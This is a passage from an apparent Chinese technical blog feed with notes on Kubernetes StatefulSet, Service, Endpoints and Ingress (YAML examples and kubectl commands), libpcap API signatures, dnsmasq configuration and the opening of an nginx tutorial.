StatefulSet 管理基于相同容器规约的一组 Pod。但和 Deployment 不同的是， StatefulSet 为它们的每个 Pod 维护了一个有粘性的 ID。这些 Pod 是基于相同的规约来创建的， 但是不能相互替换：无论怎么调度，每个 Pod 都有一个永久不变的 ID。</p><p>如果希望使用存储卷为工作负载提供持久存储，可以使用 StatefulSet 作为解决方案的一部分。 尽管 StatefulSet 中的单个 Pod 仍可能出现故障， 但持久的 Pod 标识符使得将现有卷与替换已失败 Pod 的新 Pod 相匹配变得更加容易。</p><p>StatefulSet 对于需要满足以下一个或多个需求的应用程序很有价值：</p><ul><li>稳定的、唯一的网络标识符。</li><li>稳定的、持久的存储。</li><li>有序的、优雅的部署和扩缩。</li><li>有序的、自动的滚动更新。</li></ul><p>得益于StatefulSet的这些特点,因此StatefulSet一般用于管理有状态的服务(如数据库)</p><h6 id="如何创建一个StatefulSet"><a href="#如何创建一个StatefulSet" class="headerlink" title="如何创建一个StatefulSet?"></a>如何创建一个StatefulSet?</h6><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">StatefulSet</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">web</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span> <span class="hljs-comment"># 必须匹配 .spec.template.metadata.labels</span><br>  <span class="hljs-attr">serviceName:</span> <span class="hljs-string">&quot;nginx&quot;</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span> <span class="hljs-comment"># 默认值是 1</span><br>  <span class="hljs-attr">minReadySeconds:</span> <span class="hljs-number">10</span> <span class="hljs-comment"># 默认值是 0</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span> <span class="hljs-comment"># 必须匹配 .spec.selector.matchLabels</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">terminationGracePeriodSeconds:</span> <span class="hljs-number">10</span><br>      <span class="hljs-attr">containers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">k8s.gcr.io/nginx-slim:0.8</span><br>        <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">80</span><br>          <span class="hljs-attr">name:</span> <span class="hljs-string">web</span><br>        <span class="hljs-attr">volumeMounts:</span> <span class="hljs-comment">#挂载容器卷</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">www</span><br>          <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/usr/share/nginx/html</span><br>  <span class="hljs-attr">volumeClaimTemplates:</span> <span class="hljs-comment">#</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">www</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">accessModes:</span> [ <span class="hljs-string">&quot;ReadWriteOnce&quot;</span> ]<br>      <span class="hljs-attr">storageClassName:</span> <span class="hljs-string">&quot;my-storage-class&quot;</span><br>      <span class="hljs-attr">resources:</span><br>        <span class="hljs-attr">requests:</span><br>          <span class="hljs-attr">storage:</span> <span class="hljs-string">1Gi</span><br></code></pre></td></tr></table></figure><h5 id="4-6-service"><a href="#4-6-service" class="headerlink" title="4.6.service"></a>4.6.service</h5><p>将运行在一组 <a href="https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/">Pods</a> 上的应用程序公开为网络服务的抽象方法。</p><p>使用 Kubernetes，你无需修改应用程序即可使用不熟悉的服务发现机制。 Kubernetes 为 Pods 提供自己的 IP 地址，并为一组 Pod 提供相同的 DNS 名， 并且可以在它们之间进行负载均衡。(4层的SLB)</p><p>创建和销毁 Kubernetes <a href="https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/">Pod</a> 以匹配集群的期望状态。 Pod 是非永久性资源。 如果你使用 <a href="https://kubernetes.io/zh-cn/docs/concepts/workloads/controllers/deployment/">Deployment</a> 来运行你的应用程序，则它可以动态创建和销毁 Pod。</p><p>每个 Pod 都有自己的 IP 地址，但是在 Deployment 中，在同一时刻运行的 Pod 集合可能与稍后运行该应用程序的 Pod 集合不同,因此如果直接将pod直接在网络上公开时不可靠的,因为如果公开的pod后面出现故障,新创建的pod的ip地址和之前的pod有所不同,因此我们需要一个组件将一组pod稳定的在网络上公开,因此就有了service,service会将一组pod映射到kubernetes内部的一个虚拟ip地址上(这个虚拟ip地址只有pod内部可以访问),然后将虚拟ip地址映射出去即可以实现服务的稳定。</p><p>service的暴露类型有以下几种</p><ul><li><p>clusterIP</p><p>通过集群的内部 IP 暴露服务，选择该值时服务只能够在集群内部访问。 这也是默认的 <code>ServiceType</code>。</p></li><li><p>NodePort</p><p>通过每个节点上的 IP 和静态端口（<code>NodePort</code>）暴露服务。 <code>NodePort</code> 服务会路由到自动创建的 <code>ClusterIP</code> 服务。 通过请求 <code>&lt;节点 IP&gt;:&lt;节点端口&gt;</code>，你可以从集群的外部访问一个 <code>NodePort</code> 服务。</p></li><li><p>LoadBalancer</p><p>使用云提供商的负载均衡器向外部暴露服务。 外部负载均衡器可以将流量路由到自动创建的 <code>NodePort</code> 服务和 <code>ClusterIP</code> 服务上</p></li><li><p>ExternalName</p><p>通过返回 <code>CNAME</code> 和对应值，可以将服务映射到 <code>externalName</code> 字段的内容（例如，<code>foo.bar.example.com</code>）。 无需创建任何类型代理</p></li></ul><p>service的endpoint依赖于标签选择器(selector),在创建的时候也可以不定义selector,可以稍后创建endpoint对象实现将多个pod加入到service,一般只有在以下集中情况下才会 定义没有selector的service</p><ul><li>希望在生产环境中使用外部的数据库集群，但测试环境使用自己的数据库。</li><li>希望服务指向另一个 <a href="https://kubernetes.io/zh-cn/docs/concepts/overview/working-with-objects/namespaces/">名字空间（Namespace）</a> 中或其它集群中的服务。</li><li>你正在将工作负载迁移到 Kubernetes。 在评估该方法时，你仅在 Kubernetes 中运行一部分后端。</li></ul><p>有时不需要或不想要负载均衡，以及单独的 Service IP。 遇到这种情况，可以通过指定 Cluster IP（<code>spec.clusterIP</code>）的值为 <code>&quot;None&quot;</code> 来创建 <code>Headless</code> Service。</p><p>你可以使用无头 Service 与其他服务发现机制进行接口，而不必与 Kubernetes 的实现捆绑在一起。</p><p>对这无头 Service 并不会分配 Cluster IP，kube-proxy 不会处理它们， 而且平台也不会为它们进行负载均衡和路由。 DNS 如何实现自动配置，依赖于 Service 是否定义了选择算符。</p><p>service原生提供服务的自动发现,即只要匹配了service的标签选择器,service就会自动将该服务加入到endpoint</p><h6 id="如何创建一个service？"><a href="#如何创建一个service？" class="headerlink" title="如何创建一个service？"></a>如何创建一个service？</h6><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">my-service</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">MyApp</span><br>  <span class="hljs-attr">ports:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span> <span class="hljs-comment">#指定映射的协议</span><br>      <span class="hljs-attr">port:</span> <span class="hljs-number">80</span> <span class="hljs-comment">#指定clusterip的端口</span><br>      <span class="hljs-attr">targetPort:</span> <span class="hljs-number">9376</span> <span class="hljs-comment">#指定需要映射的pod的端口</span><br></code></pre></td></tr></table></figure><h6 id="如何创建endpoint"><a href="#如何创建endpoint" class="headerlink" title="如何创建endpoint"></a>如何创建endpoint</h6><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Endpoints</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-comment"># 这里的 name 要与 Service 的名字相同</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">my-service</span><br><span class="hljs-attr">subsets:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">addresses:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">ip:</span> <span class="hljs-number">192.0</span><span class="hljs-number">.2</span><span class="hljs-number">.42</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">9376</span><br></code></pre></td></tr></table></figure><p>endpoint的端点 IPs <em>必须不可以</em> 是：本地回路（IPv4 的 127.0.0.0&#x2F;8, IPv6 的 ::1&#x2F;128）或 本地链接（IPv4 的 169.254.0.0&#x2F;16 和 224.0.0.0&#x2F;24，IPv6 的 fe80::&#x2F;64)。</p><p>端点 IP 地址不能是其他 Kubernetes 服务的集群 IP，因为 <a href="https://kubernetes.io/zh-cn/docs/reference/command-line-tools-reference/kube-proxy/">kube-proxy</a> 不支持将虚拟 IP 作为目标</p><h5 id="4-7-ingress"><a href="#4-7-ingress" class="headerlink" title="4.7.ingress"></a>4.7.ingress</h5><p><a href="https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.24/#ingress-v1beta1-networking-k8s-io">Ingress</a> 公开从集群外部到集群内<a href="https://kubernetes.io/zh-cn/docs/concepts/services-networking/service/">服务</a>的 HTTP 和 HTTPS 路由。 流量路由由 Ingress 资源上定义的规则控制。</p><pre><code class=" mermaid">graph LR;  client([client])-. Ingress-managed &lt;br&gt; load balancer .-&gt;ingress[Ingress];  ingress--&gt;|routing rule|service[Service];  subgraph cluster  ingress;  service--&gt;pod1[Pod];  service--&gt;pod2[Pod];  end  classDef plain fill:#ddd,stroke:#fff,stroke-width:4px,color:#000;  classDef k8s fill:#326ce5,stroke:#fff,stroke-width:4px,color:#fff;  classDef cluster fill:#fff,stroke:#bbb,stroke-width:2px,color:#326ce5;  class ingress,service,pod1,pod2 k8s;  class client plain;  class cluster cluster;</code></pre><p>Ingress 可为 Service 提供外部可访问的 URL、负载均衡流量、终止 SSL&#x2F;TLS，以及基于名称的虚拟托管。 <a href="https://kubernetes.io/zh-cn/docs/concepts/services-networking/ingress-controllers">Ingress 控制器</a> 通常负责通过负载均衡器来实现 Ingress，尽管它也可以配置边缘路由器或其他前端来帮助处理流量。</p><p>Ingress 不会公开任意端口或协议。 将 HTTP 和 HTTPS 以外的服务公开到 Internet 时，通常使用 <a href="https://kubernetes.io/zh-cn/docs/concepts/services-networking/service/#type-nodeport">Service.Type&#x3D;NodePort</a> 或 <a href="https://kubernetes.io/zh-cn/docs/concepts/services-networking/service/#loadbalancer">Service.Type&#x3D;LoadBalancer</a> 类型的 Service。</p><p>与service相比,service内部是通过ip+port实现4层SLB,而ingress是一个反向代理负载均衡器,他通过访问的域名和访问的url路径实现7层SLB。</p><h6 id="如何创建一个ingress"><a href="#如何创建一个ingress" class="headerlink" title="如何创建一个ingress"></a>如何创建一个ingress</h6><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">networking.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Ingress</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">ingress-wildcard-host</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">rules:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">host:</span> <span class="hljs-string">&quot;foo.bar.com&quot;</span><br>    <span class="hljs-attr">http:</span><br>      <span class="hljs-attr">paths:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">pathType:</span> <span class="hljs-string">Prefix</span><br>        <span class="hljs-attr">path:</span> <span class="hljs-string">&quot;/bar&quot;</span><br>        <span class="hljs-attr">backend:</span><br>          <span class="hljs-attr">service:</span><br>            <span class="hljs-attr">name:</span> <span class="hljs-string">service1</span><br>            <span class="hljs-attr">port:</span><br>              <span class="hljs-attr">number:</span> <span class="hljs-number">80</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">host:</span> <span class="hljs-string">&quot;*.foo.com&quot;</span><br>    <span class="hljs-attr">http:</span><br>      <span class="hljs-attr">paths:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">pathType:</span> <span class="hljs-string">Prefix</span><br>        <span class="hljs-attr">path:</span> <span class="hljs-string">&quot;/foo&quot;</span><br>        <span class="hljs-attr">backend:</span><br>          <span class="hljs-attr">service:</span><br>            <span class="hljs-attr">name:</span> <span class="hljs-string">service2</span><br>            <span class="hljs-attr">port:</span><br>              <span class="hljs-attr">number:</span> <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><h2 id="5-kubernetes的基本使用"><a href="#5-kubernetes的基本使用" class="headerlink" title="5.kubernetes的基本使用"></a>5.kubernetes的基本使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#kubernetes常用命令</span><br>kubectl get nodes <span class="hljs-comment">#查看所有节点</span><br>kubectl get pod<span class="hljs-comment">#查看所有pod</span><br>kubectl describe pod <span class="hljs-variable">$&#123;podname&#125;</span><span class="hljs-comment">#查看指定pod的详细信息</span><br>kubectl delete pod <span class="hljs-variable">$&#123;podname&#125;</span> --force --grace-period=0<br>kubectl create -f <span class="hljs-variable">$&#123;yaml&#125;</span><span class="hljs-comment">#创建资源</span><br>kubectl apply -f <span class="hljs-variable">$&#123;yaml&#125;</span><br><span class="hljs-comment">#--force指定强制删除</span><br><span class="hljs-comment">#--grace-period指定资源回收周期</span><br>kubectl expose deployment deployment-1 --port=80 --<span class="hljs-built_in">type</span>=NodeType<span class="hljs-comment">#使用命令创建一个service</span><br>kubectl run mydemo --image=docker.io/nginx:alpine --replicas=2 --record<span class="hljs-comment">#使用命令创建一个deployment</span><br>kubectl rollout <span class="hljs-built_in">history</span> deployment mystaticweb<span class="hljs-comment">#查看历史版本</span><br>kubectl rollout undo deployment deployment-1 --to-revision=5<span class="hljs-comment">#回滚到指定历史版本</span><br>kubectl <span class="hljs-built_in">set</span> image deployment deployment-1 nginx=ubuntu/nginx:latest<span class="hljs-comment">#更新deployment的指定容器镜像版本</span><br><br></code></pre></td></tr></table></figure><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>参考<a href="https://kubernetes.io/zh-cn/docs/">kubernetes官方文档</a></p>]]></content>
    
    
    <categories>
      
      <category>linux运维基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>libpcap的使用</title>
    <link href="/2022/07/08/libpcap%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/07/08/libpcap%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="libpcap的基本使用"><a href="#libpcap的基本使用" class="headerlink" title="libpcap的基本使用"></a>libpcap的基本使用</h1><h4 id="1-获取网络接口"><a href="#1-获取网络接口" class="headerlink" title="1.获取网络接口"></a>1.获取网络接口</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *<span class="hljs-title function_">pcap_lookupdev</span><span class="hljs-params">(<span class="hljs-type">char</span> *error_buffer)</span>;<span class="hljs-comment">//获取本地网络接口(返回网络接口的名称)</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pcap_findalldevs</span><span class="hljs-params">(<span class="hljs-type">pcap_if_t</span> **alldevsp, <span class="hljs-type">char</span> *errbuf)</span>;<span class="hljs-comment">//查找本地所有的网络接口</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pcap_if</span> <span class="hljs-title">pcap_if_t</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pcap_if</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pcap_if</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">char</span> *name;<span class="hljs-comment">/* name to hand to &quot;pcap_open_live()&quot; */</span><br><span class="hljs-type">char</span> *description;<span class="hljs-comment">/* textual description of interface, or NULL */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pcap_addr</span> *<span class="hljs-title">addresses</span>;</span><br>bpf_u_int32 flags;<span class="hljs-comment">/* PCAP_IF_ interface flags */</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pcap_addr</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pcap_addr</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> *<span class="hljs-title">addr</span>;</span><span class="hljs-comment">/* address */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> *<span class="hljs-title">netmask</span>;</span><span class="hljs-comment">/* netmask for that address */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> *<span class="hljs-title">broadaddr</span>;</span><span class="hljs-comment">/* broadcast address for that address */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> *<span class="hljs-title">dstaddr</span>;</span><span class="hljs-comment">/* P2P destination address for that address */</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pcap_pkthdr</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">ts</span>;</span>    <span class="hljs-comment">/* time stamp */</span><br>  bpf_u_int32 caplen;   <span class="hljs-comment">/* length of portion present */</span><br>  bpf_u_int32 len;      <span class="hljs-comment">/* length this packet (off wire) */</span><br>&#125;;<span class="hljs-comment">//抓到的包的结构</span><br><br><span class="hljs-type">char</span> *<span class="hljs-title function_">inet_ntoa</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> in_addr *addr)</span>;<span class="hljs-comment">//该函数返回的指针指向的地址空间是静态分配的,因此每次调用此函数后,后面的结果都会对上一次的结果进行覆盖</span><br><br></code></pre></td></tr></table></figure><h4 id="2-打开一个网络接口"><a href="#2-打开一个网络接口" class="headerlink" title="2.打开一个网络接口"></a>2.打开一个网络接口</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">pcap_t</span>*  <span class="hljs-title function_">pcap_open_live</span><span class="hljs-params">(<span class="hljs-type">char</span> *device,<span class="hljs-type">int</span> snaplen,<span class="hljs-type">int</span> packet_count_limit,<span class="hljs-type">int</span> timeout_limit,<span class="hljs-type">char</span> *error_buffer)</span>;<span class="hljs-comment">//打开一个网卡获得一个抓包句柄</span><br><span class="hljs-comment">//device </span><br><span class="hljs-comment">//snaplen   </span><br><span class="hljs-comment">//packet_count_limit 最大抓取的包的数量</span><br><span class="hljs-comment">//int timeout_limit  设置包从内核缓冲区拷贝到用户区所等待的时间</span><br></code></pre></td></tr></table></figure><h4 id="3-编译过滤条件"><a href="#3-编译过滤条件" class="headerlink" title="3.编译过滤条件"></a>3.编译过滤条件</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">pcap_compile</span><span class="hljs-params">(<span class="hljs-type">pcap_t</span> *handler, <span class="hljs-keyword">struct</span> bpf_program *fp, <span class="hljs-type">char</span> *<span class="hljs-built_in">exp</span>, <span class="hljs-type">int</span> optimize, bpf_u_int32 netmask)</span>;<span class="hljs-comment">//编一个过滤条件</span><br><span class="hljs-comment">//handler 打开的网卡句柄</span><br><span class="hljs-comment">//fp 存储过滤条件指针</span><br><span class="hljs-comment">//optimize 是否进行优化</span><br><span class="hljs-comment">//netmask 网络地址</span><br></code></pre></td></tr></table></figure><h4 id="4-设置过滤器"><a href="#4-设置过滤器" class="headerlink" title="4.设置过滤器"></a>4.设置过滤器</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">pcap_setfilter</span><span class="hljs-params">(<span class="hljs-type">pcap_t</span> *p, <span class="hljs-keyword">struct</span> bpf_program *fp)</span>;<span class="hljs-comment">//设置过滤器</span><br><span class="hljs-comment">//p 打开网卡的句柄</span><br><span class="hljs-comment">//fp设置的过滤表达式</span><br></code></pre></td></tr></table></figure><h4 id="5-获取包信息"><a href="#5-获取包信息" class="headerlink" title="5.获取包信息"></a>5.获取包信息</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">u_char *<span class="hljs-title function_">pcap_next</span><span class="hljs-params">(device,&amp;packet)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pcap_loop</span><span class="hljs-params">(<span class="hljs-type">pcap_t</span> *p, <span class="hljs-type">int</span> cnt,pcap_handler callback, u_char *user)</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*pcap_handler)</span><span class="hljs-params">(u_char *user, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> pcap_pkthdr *h,<span class="hljs-type">const</span> u_char *bytes)</span>;<br><span class="hljs-comment">//获取一个数据包</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>网络编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dnsmasq配置教程</title>
    <link href="/2022/07/08/dnsmasq%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/"/>
    <url>/2022/07/08/dnsmasq%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="记录一次dnsmasq配置过程"><a href="#记录一次dnsmasq配置过程" class="headerlink" title="记录一次dnsmasq配置过程"></a>记录一次dnsmasq配置过程</h1><h3 id="1-安装dnsmasq"><a href="#1-安装dnsmasq" class="headerlink" title="1.安装dnsmasq"></a>1.安装dnsmasq</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install dnsmasq<br></code></pre></td></tr></table></figure><h3 id="2-修改dnsmasq配置文件"><a href="#2-修改dnsmasq配置文件" class="headerlink" title="2.修改dnsmasq配置文件"></a>2.修改dnsmasq配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/dnsmasq.conf<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">cache-size=10240<span class="hljs-comment">#dns缓存记录大小</span><br>listen-address=192.168.0.5<span class="hljs-comment">#绑定的ip地址</span><br>addn-hosts=/etc/dnsmasq.hosts<span class="hljs-comment">#导入外部的dns解析数据</span><br>resolv-conf=/etc/dnsmasq.dnsmasq.conf<span class="hljs-comment">#指定上游dns服务器的文件</span><br></code></pre></td></tr></table></figure><h3 id="3-resolv-conf指定上游dns服务器可能不成功-未知原因"><a href="#3-resolv-conf指定上游dns服务器可能不成功-未知原因" class="headerlink" title="3.resolv-conf指定上游dns服务器可能不成功(未知原因)"></a>3.resolv-conf指定上游dns服务器可能不成功(未知原因)</h3><p>可以尝试修改&#x2F;etc&#x2F;init.d&#x2F;dnsmasq脚本</p><p>RESOLV-CONF&#x3D;&#x2F;etc&#x2F;resolv-dnsmasq.conf</p><h3 id="4-启动dns服务器"><a href="#4-启动dns服务器" class="headerlink" title="4.启动dns服务器"></a>4.启动dns服务器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl start dnsmasq.service<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>软件配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nginx使用教程</title>
    <link href="/2022/07/06/nginx%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
    <url>/2022/07/06/nginx%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="nginx使用教程"><a href="#nginx使用教程" class="headerlink" title="nginx使用教程"></a>nginx使用教程</h1><h3 id="1-什么是nginx"><a href="#1-什么是nginx" class="headerlink" title="1.什么是nginx?"></a>1.什么是nginx?</h3><p>nginx [engine x] 是 HTTP 和反向代理服务器、邮件代理服务器和通用 TCP&#x2F;UDP 代理服务器，最初由 Igor Sysoev 编写。 很长一段时间以来，它一直在许多负载很重的俄罗斯网站上运行，包括 Yandex、Mail.Ru、VK 和 Rambler。 根据 Netcraft 的数据，2022 年 5 月，nginx 服务或代理了 21.67% 最繁忙的网站。以下是一些成功案例：Dropbox、Netflix、Wordpress.com、FastMail.FM。</p><h3 id="2-如何部署安装nginx"><a href="#2-如何部署安装nginx" class="headerlink" title="2.如何部署安装nginx"></a>2.如何部署安装nginx</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install -y nginx <span class="hljs-comment">#Ubuntu/Debian</span><br>sudo yum install -y nginx <span class="hljs-comment">#rhel/centos</span><br></code></pre></td></tr></table></figure><h3 id="3-nginx的结构"><a href="#3-nginx的结构" class="headerlink" title="3.nginx的结构"></a>3.nginx的结构</h3><h4 id="3-1-nginx的启动方式"><a href="#3-1-nginx的启动方式" class="headerlink" 